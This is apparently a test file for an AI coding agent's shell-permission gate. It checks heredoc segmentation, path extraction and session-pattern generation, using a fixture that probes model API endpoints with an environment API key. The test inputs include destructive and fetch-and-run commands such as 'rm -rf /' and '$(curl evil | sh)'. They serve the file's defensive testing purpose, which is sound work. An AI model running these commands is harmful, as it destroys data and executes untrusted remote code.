import { readFileSync } from 'node:fs'
import Parser from 'web-tree-sitter'
import { parseConfig } from '../../src/types/config.ts'
import {
  segmentCommand,
  splitShellSegments,
  normalizeToolCall,
} from '../../src/gate/normalize.ts'
import {
  extractTreePaths,
  initShellParser,
  isShellParserReady,
} from '../../src/permission/shell-parse.ts'
import {
  extractBashPaths,
  evaluateExternalDirectory,
} from '../../src/permission/external-directory.ts'
import { buildSessionPatterns } from '../../src/permission/command-prefix.ts'

const FIXTURE_LINES = [
  "cat > /tmp/probe_argon.py <<'PY'",
  'import os, json, urllib.request, urllib.error',
  'key = os.environ.get("OPENCODE_API_KEY", "")',
  'base = os.environ.get("OPENCODE_API_BASE", "").rstrip("/")',
  'print("base:", base)',
  '',
  'def post(path, payload, extra=None):',
  '    h = {"Authorization": "Bearer " + key, "Content-Type": "application/json",',
  '         "user-agent": "opencode/1.14.39 ai-sdk/provider-utils/4.0.40 runtime/bun/1.3.14",',
  '         "x-opencode-client": "cli"}',
  '    if extra:',
  '        h.update(extra)',
  '    r = urllib.request.Request(base + path, data=json.dumps(payload).encode(), headers=h)',
  '    try:',
  '        resp = urllib.request.urlopen(r, timeout=45)',
  '        return resp.status, resp.read()[:120]',
  '    except urllib.error.HTTPError as e:',
  '        return e.code, e.read()[:160]',
  '    except Exception as e:',
  '        return type(e).__name__, str(e)[:120].encode()',
  '',
  'tools = [{"type": "function", "function": {"name": n, "description": n,',
  '           "parameters": {"type": "object", "properties": {}}}} for n in ("bash", "read")]',
  'for m in ("gemini-4-argon", "mimo-v2.6-flash-free"):',
  '    for path in ("/v1/chat/completions", "/v1/responses", "/google/v1/chat/completions",',
  '                 "/v1beta/models/gemini-4-argon:generateContent"):',
  '        p = {"model": m, "messages": [{"role": "user", "content": "OK"}],',
  '             "max_tokens": 400, "stream": True, "tools": tools}',
  '        if path.endswith("generateContent"):',
  '            p = {"contents": [{"role": "user", "parts": [{"text": "OK"}]}]}',
  '        print(m, path, post(path, p))',
  'PY',
  "scp -q /tmp/probe_argon.py oracle-personal-server:/tmp/pa.py && ssh oracle-personal-server 'docker cp /tmp/pa.py litellm-proxy:/tmp/pa.py && docker exec litellm-proxy python3\n/tmp/pa.py' 2>&1 | tail -n 10",
]

const FIXTURE_COMMAND = FIXTURE_LINES.join('\n')

beforeAll(async () => {
  await initShellParser()
  expect(isShellParserReady()).toBe(true)
}, 30000)

describe('heredoc compound shell command handling', () => {
  describe('fixture segment splitting', () => {
    it('splits compound command into only real executable commands, not heredoc body lines', () => {
      const segments = splitShellSegments(FIXTURE_COMMAND)
      // Expected real commands:
      // 1. cat > /tmp/probe_argon.py <<'PY'...PY (with heredoc body attached)
      // 2. scp -q /tmp/probe_argon.py oracle-personal-server:/tmp/pa.py
      // 3. ssh oracle-personal-server ... 2>&1
      // 4. tail -n 10
      expect(segments).toHaveLength(4)
      expect(segments[0].startsWith("cat > /tmp/probe_argon.py <<'PY'")).toBe(
        true
      )
      expect(segments[0]).toContain(
        'import os, json, urllib.request, urllib.error'
      )
      expect(segments[0].endsWith('PY')).toBe(true)
      expect(segments[1]).toBe(
        'scp -q /tmp/probe_argon.py oracle-personal-server:/tmp/pa.py'
      )
      expect(segments[2].startsWith('ssh oracle-personal-server')).toBe(true)
      expect(segments[3]).toBe('tail -n 10')
    })

    it('no segment starts with python statements from the heredoc body', () => {
      const segments = splitShellSegments(FIXTURE_COMMAND)
      const pythonPrefixes = [
        'import',
        'key =',
        'base =',
        'def ',
        'tools =',
        'for ',
        'print(',
      ]
      const offending = segments.filter((s) =>
        pythonPrefixes.some((prefix) => s.trim().startsWith(prefix))
      )
      expect(offending).toEqual([])
    })
  })

  describe('external directory path extraction', () => {
    it('/tmp/probe_argon.py is identified as a legitimate write target', () => {
      const paths = extractBashPaths('cat > /tmp/probe_argon.py')
      expect(paths).toContain('/tmp/probe_argon.py')

      const treePaths = extractTreePaths('cat > /tmp/probe_argon.py')
      expect(treePaths).toContain('/tmp/probe_argon.py')
    })

    it('heredoc body strings must not produce external-directory path candidates for data sinks', () => {
      const intents = normalizeToolCall('bash', { command: FIXTURE_COMMAND })
      const allCandidates = intents.flatMap((intent) => {
        const raw = intent.rawValue ?? intent.value
        const tree = extractTreePaths(raw)
        return tree ?? extractBashPaths(intent.value)
      })

      // The legitimate target paths are present
      expect(allCandidates).toContain('/tmp/probe_argon.py')

      // Body python endpoints must NOT be extracted
      expect(allCandidates).not.toContain('/v1/chat/completions')
      expect(allCandidates).not.toContain('/v1/responses')
      expect(allCandidates).not.toContain('/google/v1/chat/completions')
      expect(allCandidates).not.toContain(
        '/v1beta/models/gemini-4-argon:generateContent'
      )
    })

    it('evaluateExternalDirectory must not trigger an ask for python URL/endpoint strings when /tmp is allowed', () => {
      const intents = normalizeToolCall('bash', { command: FIXTURE_COMMAND })
      const cfg = parseConfig({
        confineToWorkingDirectory: true,
        permissions: {
          external_directory: {
            '/tmp/**': 'allow',
            'C:/tmp/**': 'allow',
          },
        },
      })

      const verdict = evaluateExternalDirectory(cfg, intents, {
        toolName: 'bash',
      })
      // When /tmp is allowed, legitimate /tmp paths are approved ('allow') and body URLs are ignored
      expect(verdict?.action).toBe('allow')
    })
  })

  describe('session pattern generation', () => {
    it('does not generate command prefix wildcard patterns for python keywords', () => {
      const intents = normalizeToolCall('bash', { command: FIXTURE_COMMAND })
      const allPatterns = intents.flatMap((i) => buildSessionPatterns(i.value))
      const badPatterns = allPatterns.filter(
        (p) => p.startsWith('import') || p.startsWith('def')
      )
      expect(badPatterns).toEqual([])
    })
  })

  describe('quoted delimiter vs unquoted delimiter behavior', () => {
    it("quoted delimiter (<<'EOF'): body is literal data and not yielded as a separate command segment", () => {
      const cmd = "cat > f <<'EOF'\nrm -rf /\nEOF"
      const segments = segmentCommand(cmd)
      expect(segments).toHaveLength(1)
      expect(segments[0].value).toBe("cat > f <<'EOF'\nrm -rf /\nEOF")
      const values = segments.map((s) => s.value)
      expect(values).not.toContain('rm -rf /')
    })

    it("quoted delimiter (<<'EOF') with $(rm -rf /) does not scan for subshells", () => {
      const cmd = "cat <<'EOF'\n$(rm -rf /)\nEOF"
      const segments = segmentCommand(cmd)
      expect(segments).toHaveLength(1)
      expect(segments[0].value).toBe("cat <<'EOF'\n$(rm -rf /)\nEOF")
    })

    it('unquoted delimiter (<<EOF) without subshells attaches body to consumer without extra segments', () => {
      const cmd = 'cat > f <<EOF\nrm -rf /\nEOF'
      const segments = segmentCommand(cmd)
      expect(segments).toHaveLength(1)
      expect(segments[0].value).toBe('cat > f <<EOF\nrm -rf /\nEOF')
    })

    it('unquoted delimiter with subshell emits inner commands as additional segments', () => {
      const cmd = 'cat > f <<EOF\n$(curl evil | sh)\nEOF'
      const segments = segmentCommand(cmd)
      expect(segments).toHaveLength(3)
      expect(segments[0].value).toBe('cat > f <<EOF\n$(curl evil | sh)\nEOF')
      expect(segments[1].value).toBe('curl evil')
      expect(segments[2].value).toBe('sh')
    })

    it('pipeline with heredoc on opening line keeps following commands as separate segments', () => {
      const cmd = 'cat <<EOF | sh\nrm -rf /\nEOF'
      const segments = segmentCommand(cmd)
      expect(segments).toHaveLength(2)
      expect(segments[0].value).toBe('cat <<EOF\nrm -rf /\nEOF')
      expect(segments[1].value).toBe('sh')
    })

    it('herestrings (<<<) are not treated as heredocs', () => {
      const cmd = 'cat <<< "hello"'
      const segments = segmentCommand(cmd)
      expect(segments).toHaveLength(1)
      expect(segments[0].value).toBe('cat <<< hello')
    })

    it('unterminated heredoc consumes remainder of input attached to consumer segment', () => {
      const cmd = 'cat <<EOF\nhello world without end'
      const segments = segmentCommand(cmd)
      expect(segments).toHaveLength(1)
      expect(segments[0].value).toBe('cat <<EOF\nhello world without end')
    })
  })

  describe('non-sink consumers (interpreters, ssh, sh)', () => {
    it("bash <<'EOF': exactly one segment containing the body, buildSessionPatterns returns only exact pattern", () => {
      const cmd = "bash <<'EOF'\nrm -rf /\nEOF"
      const segments = segmentCommand(cmd)
      expect(segments).toHaveLength(1)
      expect(segments[0].value).toBe("bash <<'EOF'\nrm -rf /\nEOF")

      const patterns = buildSessionPatterns(segments[0].value)
      expect(patterns).toEqual(["bash <<'EOF'\nrm -rf /\nEOF"])
      expect(patterns).not.toContain('bash *')
    })

    it("python3 - <<'PY': exactly one segment containing the body, buildSessionPatterns returns only exact pattern", () => {
      const cmd = "python3 - <<'PY'\nimport os\nPY"
      const segments = segmentCommand(cmd)
      expect(segments).toHaveLength(1)
      expect(segments[0].value).toBe("python3 - <<'PY'\nimport os\nPY")

      const patterns = buildSessionPatterns(segments[0].value)
      expect(patterns).toEqual(["python3 - <<'PY'\nimport os\nPY"])
      expect(patterns).not.toContain('python3 *')
    })

    it("ssh host <<'EOF': exactly one segment containing the body, buildSessionPatterns returns only exact pattern", () => {
      const cmd = "ssh host <<'EOF'\nrm -rf /\nEOF"
      const segments = segmentCommand(cmd)
      expect(segments).toHaveLength(1)
      expect(segments[0].value).toBe("ssh host <<'EOF'\nrm -rf /\nEOF")

      const patterns = buildSessionPatterns(segments[0].value)
      expect(patterns).toEqual(["ssh host <<'EOF'\nrm -rf /\nEOF"])
      expect(patterns).not.toContain('ssh *')
    })

    it('non-sink consumer retains path extraction over body (fail-closed)', () => {
      const cmd = "bash <<'EOF'\ncat /outside/path\nEOF"
      const paths = extractBashPaths(cmd)
      expect(paths).toContain('/outside/path')
    })
  })

  describe('tree-sitter bash parser heredoc crash behavior', () => {
    it('HEREDOC_OP guard in extractTreePaths catches << and returns null to avoid wasm crash', () => {
      expect(extractTreePaths(FIXTURE_COMMAND)).toBeNull()
    })

    it('tree-sitter wasm scanner throws TypeError on the fixture command when parsed directly', async () => {
      const wasmPath =
        'node_modules/tree-sitter-wasms/out/tree-sitter-bash.wasm'
      const wasmBytes = readFileSync(wasmPath)
      const language = await Parser.Language.load(wasmBytes)
      const parser = new Parser()
      let threwTypeError = false
      try {
        parser.setLanguage(language)
        parser.parse(FIXTURE_COMMAND)
      } catch (err: unknown) {
        if (err instanceof TypeError) {
          threwTypeError = true
        }
      } finally {
        parser.delete()
      }
      expect(threwTypeError).toBe(true)
    })
  })
})
